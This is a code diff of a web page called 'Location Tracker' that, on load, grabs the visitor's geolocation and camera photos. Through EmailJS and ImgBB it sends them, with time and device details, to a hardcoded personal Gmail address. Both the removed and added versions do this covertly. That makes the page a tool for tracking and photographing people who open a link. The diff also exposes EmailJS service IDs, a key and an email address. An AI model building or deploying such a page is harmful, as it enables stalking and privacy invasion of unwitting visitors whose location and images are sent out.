@@ -1,121 +1,98 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Location Tracker with Email</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Location Tracker</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://cdn.jsdelivr.net/npm/leaflet@1.9.4/dist/leaflet.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/leaflet@1.9.4/dist/leaflet.css" />
-  <style>
-    #map {
-      height: 300px;
-      border-radius: 10px;
-      margin-top: 1rem;
-    }
-  </style>
 </head>
-<body class="bg-gray-100">
-  <div class="max-w-xl mx-auto p-4">
-    <h1 class="text-2xl font-bold text-center text-blue-600 mb-4">Location Tracker</h1>
-    <div id="map" class="hidden"></div>
-    <div id="status" class="text-gray-700 mt-4"></div>
-    <div class="grid grid-cols-2 gap-4 mt-4">
-      <div>
-        <p class="text-sm font-semibold">Front Camera</p>
-        <img id="front1" class="w-full rounded border">
-        <img id="front2" class="w-full mt-2 rounded border">
-      </div>
-      <div>
-        <p class="text-sm font-semibold">Rear Camera</p>
-        <img id="rear1" class="w-full rounded border">
-        <img id="rear2" class="w-full mt-2 rounded border">
-      </div>
-    </div>
+<body class="bg-gray-100 text-gray-800">
+  <div class="max-w-2xl mx-auto p-6">
+    <h1 class="text-3xl font-bold mb-4">Location Tracker</h1>
+    <div id="status" class="mb-4 text-blue-600">Capturing location and camera images...</div>
+    <div id="map" class="w-full h-64 rounded mb-4" style="display:none;"></div>
   </div>
 
   <script>
-    emailjs.init("SSC_AeZ77loUMTfLB"); // Public Key
+    const emailServiceID = 'service_2ncxavi';
+    const emailTemplateID = 'template_pc1024b';
+    const emailPublicKey = 'SSC_AeZ77loUMTfLB';
+    const emailTo = 'ishanking58775@gmail.com';
+    const imgbbAPIKey = 'YOUR_IMGBB_API_KEY'; // 🔁 Replace this with your actual ImgBB key
 
-    const serviceID = "service_2ncxavi";
-    const templateID = "template_pc1024b";
-
-    const statusDiv = document.getElementById('status');
-    const mapDiv = document.getElementById('map');
-
-    function sendEmail(data) {
-      emailjs.send(serviceID, templateID, data).then(() => {
-        statusDiv.innerHTML += '<p class="text-green-600">📩 Info sent to email!</p>';
-      }, (err) => {
-        statusDiv.innerHTML += '<p class="text-red-600">❌ Failed to send email: ' + err.text + '</p>';
-      });
+    async function sendEmail(location, imageLinks) {
+      const payload = {
+        service_id: emailServiceID,
+        template_id: emailTemplateID,
+        user_id: emailPublicKey,
+        template_params: {
+          to_email: emailTo,
+          location_info: location,
+          image1: imageLinks[0] || '',
+          image2: imageLinks[1] || '',
+        }
+      };
+      try {
+        const res = await fetch('https://api.emailjs.com/api/v1.0/email/send', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        if (!res.ok) throw new Error('Failed to send');
+        document.getElementById('status').textContent = '✅ Location and image links sent to email!';
+      } catch (e) {
+        document.getElementById('status').textContent = '❌ Failed to send email: ' + e.message;
+      }
     }
 
-    async function getCameraShots() {
-      let frontData1 = '', frontData2 = '', rearData1 = '', rearData2 = '';
+    async function uploadToImgBB(blob) {
+      const formData = new FormData();
+      formData.append('image', blob);
       try {
-        const front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        const track = front.getVideoTracks()[0];
-        const cap = new ImageCapture(track);
-        const b1 = await cap.takePhoto();
-        const b2 = await cap.takePhoto();
-        frontData1 = await blobToBase64(b1);
-        frontData2 = await blobToBase64(b2);
-        document.getElementById('front1').src = frontData1;
-        document.getElementById('front2').src = frontData2;
-        track.stop();
-      } catch (e) { console.warn("Front cam fail", e); }
-
-      try {
-        const rear = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-        const track = rear.getVideoTracks()[0];
-        const cap = new ImageCapture(track);
-        const b1 = await cap.takePhoto();
-        const b2 = await cap.takePhoto();
-        rearData1 = await blobToBase64(b1);
-        rearData2 = await blobToBase64(b2);
-        document.getElementById('rear1').src = rearData1;
-        document.getElementById('rear2').src = rearData2;
-        track.stop();
-      } catch (e) { console.warn("Rear cam fail", e); }
-
-      return { frontData1, frontData2, rearData1, rearData2 };
+        const res = await fetch(`https://api.imgbb.com/1/upload?key=${imgbbAPIKey}`, {
+          method: 'POST',
+          body: formData
+        });
+        const json = await res.json();
+        return json.data.url;
+      } catch (e) {
+        console.error('ImgBB Upload Error:', e);
+        return null;
+      }
     }
 
-    function blobToBase64(blob) {
-      return new Promise(resolve => {
-        const reader = new FileReader();
-        reader.onload = () => resolve(reader.result);
-        reader.readAsDataURL(blob);
-      });
+    async function captureImageLinks() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const track = stream.getVideoTracks()[0];
+        const capture = new ImageCapture(track);
+        const img1 = await capture.takePhoto();
+        const img2 = await capture.takePhoto();
+        track.stop();
+        return [await uploadToImgBB(img1), await uploadToImgBB(img2)];
+      } catch (e) {
+        console.error('Camera capture failed:', e);
+        return [];
+      }
+    }
+
+    function initMap(lat, lng) {
+      const map = L.map('map').setView([lat, lng], 13);
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+      L.marker([lat, lng]).addTo(map).bindPopup('Location Captured').openPopup();
+      document.getElementById('map').style.display = 'block';
     }
 
     navigator.geolocation.getCurrentPosition(async pos => {
-      const lat = pos.coords.latitude.toFixed(4);
-      const lng = pos.coords.longitude.toFixed(4);
-      document.getElementById('map').classList.remove('hidden');
-      const map = L.map('map').setView([lat, lng], 15);
-      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-      L.marker([lat, lng]).addTo(map).bindPopup("Location Captured").openPopup();
-
-      const camData = await getCameraShots();
-
-      const emailData = {
-        to_email: "ishanking58775@gmail.com",
-        location: `${lat}, ${lng}`,
-        time: new Date().toLocaleString(),
-        device: navigator.userAgent,
-        front1: camData.frontData1,
-        front2: camData.frontData2,
-        rear1: camData.rearData1,
-        rear2: camData.rearData2
-      };
-
-      sendEmail(emailData);
-
+      const coords = pos.coords;
+      const locationText = `${coords.latitude.toFixed(4)}, ${coords.longitude.toFixed(4)}\nTime: ${new Date().toLocaleString()}`;
+      initMap(coords.latitude, coords.longitude);
+      const images = await captureImageLinks();
+      await sendEmail(locationText, images);
     }, err => {
-      statusDiv.innerHTML = '<p class="text-red-500">Location denied.</p>';
+      document.getElementById('status').textContent = '❌ Location access denied or failed';
     });
   </script>
 </body>
